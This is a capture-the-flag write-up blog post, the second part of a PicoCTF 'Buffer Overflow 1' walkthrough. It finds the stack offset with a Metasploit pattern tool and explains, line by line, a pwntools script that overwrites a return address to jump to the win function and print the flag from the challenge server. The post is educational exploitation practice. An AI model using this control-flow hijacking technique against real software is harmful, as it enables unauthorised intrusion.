---
layout: post
title: "Buffer Overflow 1 Challenge - Part 2"
date: 2024-04-09
categories: CTF
tags: [cyber-security, reverse-engineering, binary-exploitation, python]
author: sam
img_path: /assets/img/posts
---

## Buffer Overflow 1 Challenge - Part 2 - PicoCTF

- Now we know the unknown address that effects the vuln. Lets find the offset

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x35624134   
```
![Pic 5](buffer5.webp){:style="display:block; margin-left:auto; margin-right:auto; width:80%; border: 3px solid black;"}
_Offset found_

> [*] Exact match at offset 44

- We can now find the win address (the treasure chest)

> Obtaining the Flag: The goal of the exploit is to retrieve the flag, which is stored within the win function. This function reads the flag from a file and prints it to the console. Without executing the win function, we won't be able to access the flag.
> Control Flow Hijacking: The buffer overflow vulnerability in the vuln program allows us to overwrite the return address on the stack. By replacing the return address with the address of the win function, we hijack the program's control flow. When the vulnerable function finishes executing, instead of returning to the original calling function, it jumps to the win function, executing its code.

![Pic 6](buffer6.webp){:style="display:block; margin-left:auto; margin-right:auto; width:80%; border: 3px solid black;"}
_Win function is the first line_

### Writing the code, we have what we need

```python
conn = remote('saturn.picoctf.net', 57712) 
```
This line establishes a connection (conn) to the remote server 'saturn.picoctf.net' on port 57712, where the vulnerable program is running. The remote() function is provided by pwntools to handle network communication.

```python
offset = 44
target_address = 0x080491f6
```
These lines define the offset (the number of characters needed to reach the return address) and the address of the target function (win). You obtained these values during the analysis of the vulnerable program.

```python
payload = b'A' * offset + p32(target_address)
```

This line constructs the exploit payload. It consists of two parts
Padding (b'A' * offset): Fills the buffer with a sequence of 'A' characters to reach the return address.
Return Address (p32(target_address)): Packs the address of the target function (win) into little-endian format using p32().

```python
conn.sendline(payload)
```

This line sends the crafted payload to the vulnerable program over the established connection (conn). The sendline() function sends the payload followed by a newline character (\n), which is often required to trigger the vulnerable code.

```python
print(conn.recvall().decode())
```
This line receives the response from the vulnerable program after sending the payload. The recvall() function waits to receive all available data from the connection. The decode() method converts the received data from bytes to a string before printing it to the terminal.

![Pic 7](buffer7.webp){:style="display:block; margin-left:auto; margin-right:auto; width:80%; border: 3px solid black;"}
_Full python code_


Last step is your run your program and hope it works

![Pic 8](buffer8.webp){:style="display:block; margin-left:auto; margin-right:auto; width:80%; border: 3px solid black;"}
_Here is the flag!_

